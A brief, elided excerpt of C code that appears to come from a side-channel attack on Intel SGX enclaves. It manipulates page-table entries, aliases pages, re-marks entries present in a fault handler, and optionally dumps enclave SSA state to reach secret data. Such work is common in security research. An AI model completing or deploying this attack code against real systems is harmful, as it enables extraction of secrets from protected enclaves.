...
void *secret_ptr = NULL, *secret_page = NULL, *ssa_gprsgx = NULL, *alias_ssa_gprsgx = NULL;
volatile void *alias_ptr = NULL;
volatile uint64_t *pte_alias = NULL;
uint64_t *pte_alias_gprsgx = NULL;
volatile uint64_t pte_alias_unmapped = 0x0;
...
void fault_handler(int signal)
{
    ...
    *pte_alias = MARK_PRESENT(pte_alias_unmapped);
    ...
    //info("fault %d happened", fault_fired);
...
void attacker_config_page_table(void)
{
    ...
    unmap_alias();
    print_pte(pte_alias);
    info("*pte_alias is :%p, pte_alias_unmapped is :%p", *pte_alias,pte_alias_unmapped);
    #if DUMP_SSA
